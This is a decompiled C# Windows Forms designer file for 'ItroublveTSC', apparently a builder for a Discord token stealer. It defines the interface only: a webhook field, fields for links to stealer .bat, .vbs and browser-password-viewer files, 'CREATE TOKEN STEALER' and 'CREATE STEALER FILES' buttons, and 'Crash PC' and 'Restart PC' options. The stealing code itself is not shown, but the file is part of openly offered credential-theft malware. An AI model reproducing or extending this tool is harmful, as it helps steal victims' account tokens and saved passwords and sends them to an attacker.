namespace ItroublveTSC
{
    // Token: 0x02000004 RID: 4
    public partial class frmMain : global::System.Windows.Forms.Form
    {
        // Token: 0x0600001A RID: 26 RVA: 0x00002850 File Offset: 0x00000A50
        protected override void Dispose(bool disposing)
        {
            bool flag = disposing && this.components != null;
            if (flag)
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        // Token: 0x0600001B RID: 27 RVA: 0x00002888 File Offset: 0x00000A88
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmMain));
            this.RainbowTimer = new System.Windows.Forms.Timer(this.components);
            this.HeadLinePnlInf = new System.Windows.Forms.Panel();
            this.pnlRainbowTop = new System.Windows.Forms.Panel();
            this.CloseBtn = new System.Windows.Forms.Button();
            this.HeadServerLbl = new System.Windows.Forms.Label();
            this.panel25 = new System.Windows.Forms.Panel();
            this.comboBox3 = new System.Windows.Forms.ComboBox();
            this.textBox3 = new System.Windows.Forms.TextBox();
            this.button4 = new System.Windows.Forms.Button();
            this.panel26 = new System.Windows.Forms.Panel();
            this.panel27 = new System.Windows.Forms.Panel();
            this.panel36 = new System.Windows.Forms.Panel();
            this.panel37 = new System.Windows.Forms.Panel();
            this.WebhookPnl = new System.Windows.Forms.Panel();
            this.WebHookTxt = new System.Windows.Forms.TextBox();
            this.WinInfo = new System.Windows.Forms.NotifyIcon(this.components);
            this.FinalresbatPnl = new System.Windows.Forms.Panel();
            this.FinalresbatTxt = new System.Windows.Forms.TextBox();
            this.TokenStealer2VbsPnl = new System.Windows.Forms.Panel();
            this.TokenStealer2VbsTxt = new System.Windows.Forms.TextBox();
            this.TokenStealerVbsPnl = new System.Windows.Forms.Panel();
            this.TokenStealerVbsTxt = new System.Windows.Forms.TextBox();
            this.WebbrowserpassviewPnl = new System.Windows.Forms.Panel();
            this.WebbrowserpassviewTxt = new System.Windows.Forms.TextBox();
            this.SendhookfilePnl = new System.Windows.Forms.Panel();
            this.SendhookfileTxt = new System.Windows.Forms.TextBox();
            this.CreateTokenStealerBtn = new RoundBtn();
            this.CreateSendhookfileBtn = new RoundBtn();
            this.CrashPCchkbox = new System.Windows.Forms.CheckBox();
            this.panel1 = new System.Windows.Forms.Panel();
            this.roundBtn1 = new RoundBtn();
            this.RestartPCchkbox = new System.Windows.Forms.CheckBox();
            this.HeadLinePnlInf.SuspendLayout();
            this.WebhookPnl.SuspendLayout();
            this.FinalresbatPnl.SuspendLayout();
            this.TokenStealer2VbsPnl.SuspendLayout();
            this.TokenStealerVbsPnl.SuspendLayout();
            this.WebbrowserpassviewPnl.SuspendLayout();
            this.SendhookfilePnl.SuspendLayout();
            this.panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // RainbowTimer
            // 
            this.RainbowTimer.Tick += new System.EventHandler(this.RainbowTimer_Tick);
            // 
            // HeadLinePnlInf
            // 
            this.HeadLinePnlInf.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.HeadLinePnlInf.Controls.Add(this.pnlRainbowTop);
            this.HeadLinePnlInf.Controls.Add(this.CloseBtn);
            this.HeadLinePnlInf.Controls.Add(this.HeadServerLbl);
            this.HeadLinePnlInf.Controls.Add(this.panel25);
            this.HeadLinePnlInf.Controls.Add(this.comboBox3);
            this.HeadLinePnlInf.Controls.Add(this.textBox3);
            this.HeadLinePnlInf.Controls.Add(this.button4);
            this.HeadLinePnlInf.Controls.Add(this.panel26);
            this.HeadLinePnlInf.Controls.Add(this.panel27);
            this.HeadLinePnlInf.Controls.Add(this.panel36);
            this.HeadLinePnlInf.Dock = System.Windows.Forms.DockStyle.Top;
            this.HeadLinePnlInf.Location = new System.Drawing.Point(0, 0);
            this.HeadLinePnlInf.Name = "HeadLinePnlInf";
            this.HeadLinePnlInf.Size = new System.Drawing.Size(421, 29);
            this.HeadLinePnlInf.TabIndex = 6306;
            // 
            // pnlRainbowTop
            // 
            this.pnlRainbowTop.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.pnlRainbowTop.Location = new System.Drawing.Point(12, 24);
            this.pnlRainbowTop.Name = "pnlRainbowTop";
            this.pnlRainbowTop.Size = new System.Drawing.Size(396, 2);
            this.pnlRainbowTop.TabIndex = 6222;
            // 
            // CloseBtn
            // 
            this.CloseBtn.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.CloseBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CloseBtn.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(110)))), ((int)(((byte)(123)))));
            this.CloseBtn.FlatAppearance.BorderSize = 0;
            this.CloseBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.CloseBtn.Font = new System.Drawing.Font("Webdings", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(2)));
            this.CloseBtn.ForeColor = System.Drawing.Color.White;
            this.CloseBtn.Location = new System.Drawing.Point(395, -1);
            this.CloseBtn.Name = "CloseBtn";
            this.CloseBtn.Size = new System.Drawing.Size(26, 27);
            this.CloseBtn.TabIndex = 6167;
            this.CloseBtn.Text = "r";
            this.CloseBtn.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            this.CloseBtn.UseVisualStyleBackColor = false;
            this.CloseBtn.Click += new System.EventHandler(this.CloseBtn_Click);
            // 
            // HeadServerLbl
            // 
            this.HeadServerLbl.AutoSize = true;
            this.HeadServerLbl.Font = new System.Drawing.Font("Microsoft Tai Le", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.HeadServerLbl.ForeColor = System.Drawing.Color.White;
            this.HeadServerLbl.Location = new System.Drawing.Point(153, 4);
            this.HeadServerLbl.Name = "HeadServerLbl";
            this.HeadServerLbl.Size = new System.Drawing.Size(108, 21);
            this.HeadServerLbl.TabIndex = 6166;
            this.HeadServerLbl.Text = "ItroublveTSC";
            this.HeadServerLbl.MouseDown += new System.Windows.Forms.MouseEventHandler(this.HeadServerLbl_MouseDown);
            this.HeadServerLbl.MouseMove += new System.Windows.Forms.MouseEventHandler(this.HeadServerLbl_MouseMove);
            // 
            // panel25
            // 
            this.panel25.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.panel25.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.panel25.Location = new System.Drawing.Point(362, -44);
            this.panel25.Name = "panel25";
            this.panel25.Size = new System.Drawing.Size(2, 25);
            this.panel25.TabIndex = 6160;
            // 
            // comboBox3
            // 
            this.comboBox3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.comboBox3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBox3.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold);
            this.comboBox3.ForeColor = System.Drawing.Color.Silver;
            this.comboBox3.FormattingEnabled = true;
            this.comboBox3.Location = new System.Drawing.Point(364, -44);
            this.comboBox3.Name = "comboBox3";
            this.comboBox3.Size = new System.Drawing.Size(254, 25);
            this.comboBox3.TabIndex = 6154;
            // 
            // textBox3
            // 
            this.textBox3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.textBox3.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.textBox3.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBox3.ForeColor = System.Drawing.Color.White;
            this.textBox3.Location = new System.Drawing.Point(364, -42);
            this.textBox3.Multiline = true;
            this.textBox3.Name = "textBox3";
            this.textBox3.Size = new System.Drawing.Size(231, 21);
            this.textBox3.TabIndex = 6156;
            this.textBox3.Text = " Voice Channel";
            // 
            // button4
            // 
            this.button4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.button4.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(68)))), ((int)(((byte)(173)))));
            this.button4.FlatAppearance.BorderSize = 0;
            this.button4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button4.Font = new System.Drawing.Font("Webdings", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(2)));
            this.button4.ForeColor = System.Drawing.Color.Silver;
            this.button4.Location = new System.Drawing.Point(594, -43);
            this.button4.Name = "button4";
            this.button4.Size = new System.Drawing.Size(25, 22);
            this.button4.TabIndex = 6155;
            this.button4.Text = "6";
            this.button4.UseVisualStyleBackColor = false;
            // 
            // panel26
            // 
            this.panel26.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.panel26.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.panel26.Location = new System.Drawing.Point(364, -21);
            this.panel26.Name = "panel26";
            this.panel26.Size = new System.Drawing.Size(254, 2);
            this.panel26.TabIndex = 6157;
            // 
            // panel27
            // 
            this.panel27.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.panel27.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.panel27.Location = new System.Drawing.Point(364, -44);
            this.panel27.Name = "panel27";
            this.panel27.Size = new System.Drawing.Size(254, 2);
            this.panel27.TabIndex = 6158;
            // 
            // panel36
            // 
            this.panel36.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.panel36.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.panel36.Location = new System.Drawing.Point(617, -44);
            this.panel36.Name = "panel36";
            this.panel36.Size = new System.Drawing.Size(2, 25);
            this.panel36.TabIndex = 6159;
            // 
            // panel37
            // 
            this.panel37.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.panel37.Location = new System.Drawing.Point(-1631, 404);
            this.panel37.Name = "panel37";
            this.panel37.Size = new System.Drawing.Size(3814, 2);
            this.panel37.TabIndex = 6307;
            // 
            // WebhookPnl
            // 
            this.WebhookPnl.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.WebhookPnl.Controls.Add(this.WebHookTxt);
            this.WebhookPnl.Location = new System.Drawing.Point(13, 47);
            this.WebhookPnl.Name = "WebhookPnl";
            this.WebhookPnl.Size = new System.Drawing.Size(395, 32);
            this.WebhookPnl.TabIndex = 6308;
            // 
            // WebHookTxt
            // 
            this.WebHookTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.WebHookTxt.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.WebHookTxt.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.WebHookTxt.ForeColor = System.Drawing.Color.DarkGray;
            this.WebHookTxt.Location = new System.Drawing.Point(7, 7);
            this.WebHookTxt.Name = "WebHookTxt";
            this.WebHookTxt.Size = new System.Drawing.Size(379, 18);
            this.WebHookTxt.TabIndex = 6153;
            this.WebHookTxt.Text = "WebHook Here";
            // 
            // WinInfo
            // 
            this.WinInfo.BalloonTipTitle = "Discord Raider";
            this.WinInfo.Visible = true;
            // 
            // FinalresbatPnl
            // 
            this.FinalresbatPnl.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.FinalresbatPnl.Controls.Add(this.FinalresbatTxt);
            this.FinalresbatPnl.Location = new System.Drawing.Point(12, 92);
            this.FinalresbatPnl.Name = "FinalresbatPnl";
            this.FinalresbatPnl.Size = new System.Drawing.Size(395, 32);
            this.FinalresbatPnl.TabIndex = 6321;
            // 
            // FinalresbatTxt
            // 
            this.FinalresbatTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.FinalresbatTxt.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.FinalresbatTxt.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.FinalresbatTxt.ForeColor = System.Drawing.Color.DarkGray;
            this.FinalresbatTxt.Location = new System.Drawing.Point(7, 7);
            this.FinalresbatTxt.Name = "FinalresbatTxt";
            this.FinalresbatTxt.Size = new System.Drawing.Size(379, 18);
            this.FinalresbatTxt.TabIndex = 6153;
            this.FinalresbatTxt.Text = "Token Stealer.bat Link Here";
            // 
            // TokenStealer2VbsPnl
            // 
            this.TokenStealer2VbsPnl.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.TokenStealer2VbsPnl.Controls.Add(this.TokenStealer2VbsTxt);
            this.TokenStealer2VbsPnl.Location = new System.Drawing.Point(11, 184);
            this.TokenStealer2VbsPnl.Name = "TokenStealer2VbsPnl";
            this.TokenStealer2VbsPnl.Size = new System.Drawing.Size(395, 32);
            this.TokenStealer2VbsPnl.TabIndex = 6323;
            // 
            // TokenStealer2VbsTxt
            // 
            this.TokenStealer2VbsTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.TokenStealer2VbsTxt.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.TokenStealer2VbsTxt.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.TokenStealer2VbsTxt.ForeColor = System.Drawing.Color.DarkGray;
            this.TokenStealer2VbsTxt.Location = new System.Drawing.Point(7, 7);
            this.TokenStealer2VbsTxt.Name = "TokenStealer2VbsTxt";
            this.TokenStealer2VbsTxt.Size = new System.Drawing.Size(379, 18);
            this.TokenStealer2VbsTxt.TabIndex = 6153;
            this.TokenStealer2VbsTxt.Text = "Token Stealer2.vbs Link Here";
            // 
            // TokenStealerVbsPnl
            // 
            this.TokenStealerVbsPnl.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.TokenStealerVbsPnl.Controls.Add(this.TokenStealerVbsTxt);
            this.TokenStealerVbsPnl.Location = new System.Drawing.Point(12, 139);
            this.TokenStealerVbsPnl.Name = "TokenStealerVbsPnl";
            this.TokenStealerVbsPnl.Size = new System.Drawing.Size(395, 32);
            this.TokenStealerVbsPnl.TabIndex = 6322;
            // 
            // TokenStealerVbsTxt
            // 
            this.TokenStealerVbsTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.TokenStealerVbsTxt.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.TokenStealerVbsTxt.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.TokenStealerVbsTxt.ForeColor = System.Drawing.Color.DarkGray;
            this.TokenStealerVbsTxt.Location = new System.Drawing.Point(7, 7);
            this.TokenStealerVbsTxt.Name = "TokenStealerVbsTxt";
            this.TokenStealerVbsTxt.Size = new System.Drawing.Size(379, 18);
            this.TokenStealerVbsTxt.TabIndex = 6153;
            this.TokenStealerVbsTxt.Text = "Token Stealer.vbs Link Here";
            // 
            // WebbrowserpassviewPnl
            // 
            this.WebbrowserpassviewPnl.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.WebbrowserpassviewPnl.Controls.Add(this.WebbrowserpassviewTxt);
            this.WebbrowserpassviewPnl.Location = new System.Drawing.Point(10, 277);
            this.WebbrowserpassviewPnl.Name = "WebbrowserpassviewPnl";
            this.WebbrowserpassviewPnl.Size = new System.Drawing.Size(395, 32);
            this.WebbrowserpassviewPnl.TabIndex = 6325;
            // 
            // WebbrowserpassviewTxt
            // 
            this.WebbrowserpassviewTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.WebbrowserpassviewTxt.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.WebbrowserpassviewTxt.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.WebbrowserpassviewTxt.ForeColor = System.Drawing.Color.DarkGray;
            this.WebbrowserpassviewTxt.Location = new System.Drawing.Point(7, 7);
            this.WebbrowserpassviewTxt.Name = "WebbrowserpassviewTxt";
            this.WebbrowserpassviewTxt.Size = new System.Drawing.Size(379, 18);
            this.WebbrowserpassviewTxt.TabIndex = 6153;
            this.WebbrowserpassviewTxt.Text = "Webbrowserpassview.exe Link Here";
            // 
            // SendhookfilePnl
            // 
            this.SendhookfilePnl.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.SendhookfilePnl.Controls.Add(this.SendhookfileTxt);
            this.SendhookfilePnl.Location = new System.Drawing.Point(11, 232);
            this.SendhookfilePnl.Name = "SendhookfilePnl";
            this.SendhookfilePnl.Size = new System.Drawing.Size(395, 32);
            this.SendhookfilePnl.TabIndex = 6324;
            // 
            // SendhookfileTxt
            // 
            this.SendhookfileTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.SendhookfileTxt.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.SendhookfileTxt.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.SendhookfileTxt.ForeColor = System.Drawing.Color.DarkGray;
            this.SendhookfileTxt.Location = new System.Drawing.Point(7, 7);
            this.SendhookfileTxt.Name = "SendhookfileTxt";
            this.SendhookfileTxt.Size = new System.Drawing.Size(379, 18);
            this.SendhookfileTxt.TabIndex = 6153;
            this.SendhookfileTxt.Text = "Sendhookfile.exe Link Here";
            // 
            // CreateTokenStealerBtn
            // 
            this.CreateTokenStealerBtn.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.CreateTokenStealerBtn.ButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.CreateTokenStealerBtn.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CreateTokenStealerBtn.FlatAppearance.BorderSize = 0;
            this.CreateTokenStealerBtn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CreateTokenStealerBtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CreateTokenStealerBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.CreateTokenStealerBtn.Font = new System.Drawing.Font("Segoe UI Black", 8.25F, System.Drawing.FontStyle.Bold);
            this.CreateTokenStealerBtn.Location = new System.Drawing.Point(247, 373);
            this.CreateTokenStealerBtn.Name = "CreateTokenStealerBtn";
            this.CreateTokenStealerBtn.OnHoverBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
            this.CreateTokenStealerBtn.OnHoverButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
            this.CreateTokenStealerBtn.OnHoverTextColor = System.Drawing.Color.White;
            this.CreateTokenStealerBtn.Size = new System.Drawing.Size(161, 25);
            this.CreateTokenStealerBtn.TabIndex = 6326;
            this.CreateTokenStealerBtn.Text = "CREATE TOKEN STEALER";
            this.CreateTokenStealerBtn.TextColor = System.Drawing.Color.White;
            this.CreateTokenStealerBtn.UseVisualStyleBackColor = true;
            this.CreateTokenStealerBtn.Click += new System.EventHandler(this.roundBtn1_Click);
            // 
            // CreateSendhookfileBtn
            // 
            this.CreateSendhookfileBtn.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.CreateSendhookfileBtn.ButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.CreateSendhookfileBtn.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CreateSendhookfileBtn.FlatAppearance.BorderSize = 0;
            this.CreateSendhookfileBtn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CreateSendhookfileBtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CreateSendhookfileBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.CreateSendhookfileBtn.Font = new System.Drawing.Font("Segoe UI Black", 8.25F, System.Drawing.FontStyle.Bold);
            this.CreateSendhookfileBtn.Location = new System.Drawing.Point(10, 373);
            this.CreateSendhookfileBtn.Name = "CreateSendhookfileBtn";
            this.CreateSendhookfileBtn.OnHoverBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
            this.CreateSendhookfileBtn.OnHoverButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
            this.CreateSendhookfileBtn.OnHoverTextColor = System.Drawing.Color.White;
            this.CreateSendhookfileBtn.Size = new System.Drawing.Size(161, 25);
            this.CreateSendhookfileBtn.TabIndex = 6320;
            this.CreateSendhookfileBtn.Text = "CREATE STEALER FILES";
            this.CreateSendhookfileBtn.TextColor = System.Drawing.Color.White;
            this.CreateSendhookfileBtn.UseVisualStyleBackColor = true;
            this.CreateSendhookfileBtn.Click += new System.EventHandler(this.CreateBtn_Click);
            // 
            // CrashPCchkbox
            // 
            this.CrashPCchkbox.AccessibleName = "CrashPCchkbox";
            this.CrashPCchkbox.AutoSize = true;
            this.CrashPCchkbox.ForeColor = System.Drawing.SystemColors.Window;
            this.CrashPCchkbox.Location = new System.Drawing.Point(3, 8);
            this.CrashPCchkbox.Name = "CrashPCchkbox";
            this.CrashPCchkbox.Size = new System.Drawing.Size(70, 17);
            this.CrashPCchkbox.TabIndex = 6328;
            this.CrashPCchkbox.Text = "Crash PC";
            this.CrashPCchkbox.UseVisualStyleBackColor = true;
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.panel1.Controls.Add(this.roundBtn1);
            this.panel1.Controls.Add(this.RestartPCchkbox);
            this.panel1.Controls.Add(this.CrashPCchkbox);
            this.panel1.Location = new System.Drawing.Point(10, 325);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(397, 32);
            this.panel1.TabIndex = 6329;
            // 
            // roundBtn1
            // 
            this.roundBtn1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.roundBtn1.ButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.roundBtn1.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.roundBtn1.FlatAppearance.BorderSize = 0;
            this.roundBtn1.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.roundBtn1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.roundBtn1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.roundBtn1.Font = new System.Drawing.Font("Segoe UI Black", 8.25F, System.Drawing.FontStyle.Bold);
            this.roundBtn1.Location = new System.Drawing.Point(157, 4);
            this.roundBtn1.Name = "roundBtn1";
            this.roundBtn1.OnHoverBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
            this.roundBtn1.OnHoverButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
            this.roundBtn1.OnHoverTextColor = System.Drawing.Color.White;
            this.roundBtn1.Size = new System.Drawing.Size(81, 25);
            this.roundBtn1.TabIndex = 6330;
            this.roundBtn1.Text = "How To Use?";
            this.roundBtn1.TextColor = System.Drawing.Color.White;
            this.roundBtn1.UseVisualStyleBackColor = true;
            this.roundBtn1.Click += new System.EventHandler(this.roundBtn1_Click_1);
            // 
            // RestartPCchkbox
            // 
            this.RestartPCchkbox.AccessibleName = "RestartPCchkbox";
            this.RestartPCchkbox.AutoSize = true;
            this.RestartPCchkbox.ForeColor = System.Drawing.SystemColors.Window;
            this.RestartPCchkbox.Location = new System.Drawing.Point(317, 8);
            this.RestartPCchkbox.Name = "RestartPCchkbox";
            this.RestartPCchkbox.Size = new System.Drawing.Size(77, 17);
            this.RestartPCchkbox.TabIndex = 6329;
            this.RestartPCchkbox.Text = "Restart PC";
            this.RestartPCchkbox.UseVisualStyleBackColor = true;
            // 
            // frmMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.ClientSize = new System.Drawing.Size(421, 418);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.CreateTokenStealerBtn);
            this.Controls.Add(this.WebbrowserpassviewPnl);
            this.Controls.Add(this.TokenStealer2VbsPnl);
            this.Controls.Add(this.SendhookfilePnl);
            this.Controls.Add(this.TokenStealerVbsPnl);
            this.Controls.Add(this.FinalresbatPnl);
            this.Controls.Add(this.CreateSendhookfileBtn);
            this.Controls.Add(this.WebhookPnl);
            this.Controls.Add(this.panel37);
            this.Controls.Add(this.HeadLinePnlInf);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "frmMain";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "ItroublveTSC";
            this.Load += new System.EventHandler(this.frmMain_Load);
            this.HeadLinePnlInf.ResumeLayout(false);
            this.HeadLinePnlInf.PerformLayout();
            this.WebhookPnl.ResumeLayout(false);
            this.WebhookPnl.PerformLayout();
            this.FinalresbatPnl.ResumeLayout(false);
            this.FinalresbatPnl.PerformLayout();
            this.TokenStealer2VbsPnl.ResumeLayout(false);
            this.TokenStealer2VbsPnl.PerformLayout();
            this.TokenStealerVbsPnl.ResumeLayout(false);
            this.TokenStealerVbsPnl.PerformLayout();
            this.WebbrowserpassviewPnl.ResumeLayout(false);
            this.WebbrowserpassviewPnl.PerformLayout();
            this.SendhookfilePnl.ResumeLayout(false);
            this.SendhookfilePnl.PerformLayout();
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.ResumeLayout(false);

        }

        // Token: 0x0400000E RID: 14
        private global::System.ComponentModel.IContainer components = null;

        // Token: 0x0400000F RID: 15
        private global::System.Windows.Forms.Timer RainbowTimer;

        // Token: 0x04000010 RID: 16
        private global::System.Windows.Forms.Panel HeadLinePnlInf;

        // Token: 0x04000011 RID: 17
        private global::System.Windows.Forms.Panel pnlRainbowTop;

        // Token: 0x04000012 RID: 18
        private global::System.Windows.Forms.Button CloseBtn;

        // Token: 0x04000013 RID: 19
        private global::System.Windows.Forms.Label HeadServerLbl;

        // Token: 0x04000014 RID: 20
        private global::System.Windows.Forms.Panel panel25;

        // Token: 0x04000015 RID: 21
        private global::System.Windows.Forms.ComboBox comboBox3;

        // Token: 0x04000016 RID: 22
        private global::System.Windows.Forms.TextBox textBox3;

        // Token: 0x04000017 RID: 23
        private global::System.Windows.Forms.Button button4;

        // Token: 0x04000018 RID: 24
        private global::System.Windows.Forms.Panel panel26;

        // Token: 0x04000019 RID: 25
